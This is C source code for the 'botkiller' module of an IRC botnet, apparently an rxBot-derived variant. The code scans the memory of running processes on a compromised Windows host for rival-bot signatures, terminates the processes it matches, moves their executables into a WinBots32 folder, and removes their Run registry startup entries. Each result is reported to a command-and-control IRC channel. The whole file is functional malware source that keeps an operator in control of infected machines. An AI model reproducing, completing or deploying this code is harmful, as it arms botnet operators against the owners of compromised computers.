#include "includes.h"
#include "functions.h"
#include "externs.h"

char sendbuf[MEDBUF];
char string_installregistrystartup[] = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
int bCapture = 0;

char *stristr(const char *str, const char *strSearch)
{
	char *pszSearch, *pszStart, *pszString;
	for (pszStart = (char *)str; *pszStart != NULL; pszStart++)
	{
		for (; ((*pszStart != NULL) && (toupper(*pszStart) != toupper(*strSearch))); pszStart++)
			if (NULL == *pszStart)
					return NULL;
			pszSearch = (char *)strSearch;
			pszString = (char *)pszStart;
		while (toupper(*pszString) == toupper(*pszSearch))
		{
				pszString++;
				pszSearch++;
			if (NULL == *pszSearch)
					return (pszStart);
		}
	}
		return NULL;
}

bool file_exists(char *pszFilePath)
{
	HANDLE hFile;

		hFile = CreateFile(pszFilePath,
				GENERIC_READ,
				FILE_SHARE_READ,
				NULL,
				OPEN_EXISTING,
				FILE_ATTRIBUTE_NORMAL,
				NULL);
	if (hFile == INVALID_HANDLE_VALUE)
			return FALSE;
		CloseHandle(hFile);
		return TRUE;
}

bool file_delete(char *pszFilePath)
{
	if (!file_exists(pszFilePath))
			return FALSE;
	if (!DeleteFile(pszFilePath))
			return FALSE;
		return TRUE;
}

void *memmem(const void *buf, const void *pattern, size_t buflen, size_t len)
{
	char *bf = (char *)buf, *pt = (char *)pattern;
	size_t i, j;

	if (len > buflen)
			return (void *)NULL;
	for (i = 0; i <= (buflen - len); ++i)
	{
		for (j = 0; j < len; ++j)
			if (pt[j] != bf[i + j])
				break;
		if (j == len)
				return (bf + i);
	}
		return NULL;
}

bool process_killpid(DWORD dwPID)
{
	HANDLE hProcess;

	if (GetCurrentProcessId() == dwPID)
			return FALSE;
		hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, dwPID);
	if (!hProcess)
			return FALSE;
	if (TerminateProcess(hProcess, 0) != 0)
	{
			CloseHandle(hProcess);
			return TRUE;
	}
		CloseHandle(hProcess);
		return FALSE;
}

DWORD WINAPI botkiller_main(LPVOID param)
{
	char szSignature[LOWBUF];
	CRITICAL_SECTION ct;
	DWORD dwTime;
	HANDLE hProcess;
	int nBotsKilled = 0, nBotsRemoved = 0;
	PROCESSENTRY32 pe32;
	SBotKiller s_bk = *((SBotKiller *)param);

		InitializeCriticalSection(&ct);
		hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		pe32.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hProcess, &pe32))
	{
			CloseHandle(hProcess);
			DeleteCriticalSection(&ct);
			if(!s_bk.Silent) {
				sprintf(sendbuf, "There was an error");
				irc_privmsg(s_bk.ChanSock, s_bk.Channel, sendbuf, s_bk.notice);
			}
			return 0;
	}
	
			if(!s_bk.Silent) {
				sprintf(sendbuf, "Botcheck started.");
				irc_privmsg(s_bk.ChanSock, s_bk.Channel, sendbuf, s_bk.notice);
			}

		dwTime = GetTickCount();

	while (Process32Next(hProcess, &pe32))
	{
		if (GetCurrentProcessId() != pe32.th32ProcessID)
		{
				EnterCriticalSection(&ct);
			if (pe32.cntThreads >= 64)
			{
/*				if (process_killpid(pe32.th32ProcessID))
				{
						nBotsKilled++;
						Sleep(FLOOD_DELAY);
					if (!s_bk.m_bSilent)
							irc_message(s_bk.m_bsock, s_bk.m_szAction, s_bk.m_szDestination,
									(char *)string_botkillerkilledprocess,
									CGREEN, string_replybotkiller, CEND, string_replydotbot,
									CBLUE, CEND, pe32.szExeFile,
									CBLUE, CEND, "");
						Sleep(FLOOD_DELAY);
						nBotsRemoved += botkiller_removebot(pe32.szExeFile, &s_bk);
				}*/
			}
			else if (botkiller_memscan(pe32.th32ProcessID, szSignature, sizeof(szSignature) - 1))
			{
				if((strcmp(pe32.szExeFile, "mirc.exe") == 0) || (strcmp(pe32.szExeFile,
					"BitComet.exe") == 0) || (strcmp(pe32.szExeFile, "explorer.exe") == 0));
				else if (process_killpid(pe32.th32ProcessID))
				//if (killprocess(pe32.szExeFile) == true)
				{
					if(!s_bk.Silent) {
						sprintf(sendbuf, "[%s] Has been killed.", pe32.szExeFile);
						irc_privmsg(s_bk.ChanSock, s_bk.Channel, sendbuf, s_bk.notice);
					}
						nBotsKilled++;
						Sleep(FLOOD_DELAY);
						nBotsRemoved += botkiller_removebot(pe32.szExeFile, &s_bk);
				}
			}
				LeaveCriticalSection(&ct);
		}
	}
		CloseHandle(hProcess);
		DeleteCriticalSection(&ct);
	
	if(!s_bk.Silent) {
		sprintf(sendbuf, "Botcheck Finished, %d Killed, %d Captured, %d Removed.", nBotsKilled, bCapture, nBotsRemoved);
		irc_privmsg(s_bk.ChanSock, s_bk.Channel, sendbuf, s_bk.notice);
	}
	bCapture = 0;

	return 0;
}

//botbotbotbotbotbotbotbotbotbotbotbotbot
//Original code by Bjoern Stickler
//http://intex.ath.cx/
//botbotbotbotbotbotbotbotbotbotbotbotbot

bool botkiller_memscan(DWORD dwPID, char *pszBuffer, DWORD dwSize)
{
	char *rgpszSignatureList[] =
	{
		"PONG",
//		"SocksCap",
//			"advscan", //advscan (rxBot + mods)
//			"expscan.start", //YaBot
//			"scan.stop", // (AgoBot/dopebot/PhatBot)
			NULL
	};
	BYTE byBuffer[0x1000];
	DWORD dwAddress = 0, dwBaseAddress, dwOffset = 0, dwRead;
	HANDLE hProcess, hToken;
	int i;

	if (!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
			return FALSE;
		hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE, dwPID);
	if (!hProcess)
	{
			CloseHandle(hToken);
			return FALSE;
	}
	for (i = 0; i < ARRAYSIZE(rgpszSignatureList); i++)
	{
		if (!rgpszSignatureList[i])
				break;

		//printf("@@202 -> %s\n", rgpszSignatureList[i]);
		for (dwBaseAddress = 0; dwBaseAddress < 0x80000000; dwBaseAddress += 0x1000)
		{
				memset(byBuffer, 0, 0x1000);
			if (ReadProcessMemory(hProcess, (void *)dwBaseAddress, byBuffer, 0x1000, &dwRead))
			{
				while ((dwAddress = (DWORD)memmem((const void *)(byBuffer + dwOffset),
							(const void *)rgpszSignatureList[i],
							0x1000 - dwOffset,
							strlen(rgpszSignatureList[i]))))
				{
						dwOffset = dwAddress - (DWORD)byBuffer;
					if ((dwAddress != 0) && (dwOffset != 0))
					{
							strncpy(pszBuffer, rgpszSignatureList[i], dwSize);
							CloseHandle(hToken);
							CloseHandle(hProcess);
							return TRUE;
					}
				}
			}
		}
	}
		CloseHandle(hToken);
		CloseHandle(hProcess);
		return FALSE;
}

int botkiller_removebot(char *pszFileName, LPVOID param)
{
	char szFilePath[MAX_PATH], szValueData[MEDBUF], szValueName[MEDBUF], CDIR[MAX_PATH], MDIR[MAX_PATH];
	DWORD dwIndex, dwSize1, dwSize2, dwValueType;
	HKEY hKey, rk;
	int i, nReturn = 0;
	SBotKiller s_bk = *((SBotKiller *)param);

	SYSTEMTIME cTime;
	GetLocalTime(&cTime);

		memset(szFilePath, 0, sizeof(szFilePath));
		GetWindowsDirectory(szFilePath, sizeof(szFilePath) - 1);

		sprintf(CDIR, "%s\\WinBots32\\%d-%d-%d.%d-%d-%d.bot", szFilePath, cTime.wDay,
			cTime.wMonth, cTime.wYear, cTime.wHour, cTime.wMinute, cTime.wSecond);
		sprintf(MDIR, "%s\\WinBots32", szFilePath);

		strncat(szFilePath,
				"\\",
				(sizeof(szFilePath) - strlen(szFilePath)) - 1);
		strncat(szFilePath,
				pszFileName,
				(sizeof(szFilePath) - strlen(szFilePath)) - 1);

		CreateDirectory(MDIR, NULL);

		//if(CopyFile(szFilePath, CFILE, TRUE) != 0) {
/*		if(CopyFile(szFilePath, CDIR, FALSE) != 0) {
			if(!s_bk.Silent) {
				sprintf(sendbuf, "Executable has been copied to: %s", CDIR);
				enc_privmsg(s_bk.ChanSock, s_bk.Channel, sendbuf, s_bk.notice);
			}*/

/*			if (file_delete(szFilePath))
			{
					if(!s_bk.Silent) {
						sprintf(sendbuf, "[%s] Has been deleted.", szFilePath);
						enc_privmsg(s_bk.ChanSock, s_bk.Channel, sendbuf, s_bk.notice);
					}
					nReturn++;
			}*/
		if(MoveFile(szFilePath, CDIR) != 0) {
			if(!s_bk.Silent) {
				sprintf(sendbuf, "Bot EXE has been moved to [%s].", CDIR);
				irc_privmsg(s_bk.ChanSock, s_bk.Channel, sendbuf, s_bk.notice);
			}
			bCapture++;
		}

/*		}
		else {
			char rbuf[LOWBUF];
			sprintf(rbuf, "Error: [%d]", GetLastError());
			MessageBox(NULL, rbuf, "", MB_OK);
		}*/
/*		else if(GetLastError() == ERROR_PATH_NOT_FOUND) {
			CreateDirectory(CDIR, NULL);

			//if(CopyFile(szFilePath, CFILE, TRUE) != 0) {
			if(CopyFile(szFilePath, CDIR, TRUE) != 0) {
				if(!s_bk.Silent) {
					sprintf(sendbuf, "Executable has been copied to: %s", CFILE);
					enc_privmsg(s_bk.ChanSock, s_bk.Channel, sendbuf, s_bk.notice);
				}

				if (file_delete(szFilePath))
				{
					if(!s_bk.Silent) {
						sprintf(sendbuf, "[%s] Has been deleted.", szFilePath);
						enc_privmsg(s_bk.ChanSock, s_bk.Channel, sendbuf, s_bk.notice);
					}
						nReturn++;
				}
			}
		}*/

		memset(szFilePath, 0, sizeof(szFilePath));
		GetSystemDirectory(szFilePath, sizeof(szFilePath) - 1);
		strncat(szFilePath,
				"\\",
				(sizeof(szFilePath) - strlen(szFilePath)) - 1);
		strncat(szFilePath,
				pszFileName,
				(sizeof(szFilePath) - strlen(szFilePath)) - 1);

		//if(CopyFile(szFilePath, CFILE, TRUE) != 0) {
/*		if(CopyFile(szFilePath, CDIR, TRUE) != 0) {
			if(!s_bk.Silent) {
				sprintf(sendbuf, "Executable has been copied to: %s", CDIR);
				enc_privmsg(s_bk.ChanSock, s_bk.Channel, sendbuf, s_bk.notice);
			}*/

			/*if (file_delete(szFilePath))
			{
				if(!s_bk.Silent) {
					sprintf(sendbuf, "[%s] Has been deleted.", szFilePath);
					enc_privmsg(s_bk.ChanSock, s_bk.Channel, sendbuf, s_bk.notice);
				}
					nReturn++;
			}*/
		if(MoveFile(szFilePath, CDIR) != 0) {
			if(!s_bk.Silent) {
				sprintf(sendbuf, "Bot EXE has been moved to [%s].", CDIR);
				irc_privmsg(s_bk.ChanSock, s_bk.Channel, sendbuf, s_bk.notice);
			}
			bCapture++;
		}
/*		}
		else {
			char rbuf[LOWBUF];
			sprintf(rbuf, "Error: [%d]", GetLastError());
			MessageBox(NULL, rbuf, "", MB_OK);
		}*/
/*		else if(GetLastError() == ERROR_PATH_NOT_FOUND) {
			CreateDirectory(CDIR, NULL);

			//if(CopyFile(szFilePath, CFILE, TRUE) != 0) {
			if(CopyFile(szFilePath, CDIR, TRUE) != 0) {
				if(!s_bk.Silent) {
					sprintf(sendbuf, "Executable has been copied to: %s", CFILE);
					enc_privmsg(s_bk.ChanSock, s_bk.Channel, sendbuf, s_bk.notice);
				}

				if (file_delete(szFilePath))
				{
					if(!s_bk.Silent) {
						sprintf(sendbuf, "[%s] Has been deleted.", szFilePath);
						enc_privmsg(s_bk.ChanSock, s_bk.Channel, sendbuf, s_bk.notice);
					}
						nReturn++;
				}
			}
		}*/

	for (i = 0; i < 2; i++)
	{
		if (!i)
				hKey = HKEY_CURRENT_USER;
		else
				hKey = HKEY_LOCAL_MACHINE;
		if (RegOpenKeyEx(hKey,
					string_installregistrystartup,
					0,
					KEY_ALL_ACCESS,
					&rk) == ERROR_SUCCESS)
		{
				dwIndex = 0;
				dwSize1 = MEDBUF - 1;
				dwSize2 = MEDBUF - 1;
			while (RegEnumValue(rk,
						dwIndex,
						szValueName,
						&dwSize1,
						NULL,
						&dwValueType,
						(BYTE *)&szValueData,
						&dwSize2) == ERROR_SUCCESS)
			{
				if (dwValueType == REG_SZ)
				{
					if (stristr(szValueData, pszFileName))
					{
						if (RegDeleteValue(rk, szValueName) == ERROR_SUCCESS)
						{
							if(!s_bk.Silent) {
								sprintf(sendbuf, "[%s] -> [%s]    Has been deleted successfully.", pszFileName, szValueName);
								irc_privmsg(s_bk.ChanSock, s_bk.Channel, sendbuf, s_bk.notice);
							}
								nReturn++;
						}
					}
				}
					dwSize1 = MEDBUF - 1;
					dwSize2 = MEDBUF - 1;
					dwIndex++;
			}
		}
	}
		return nReturn;
}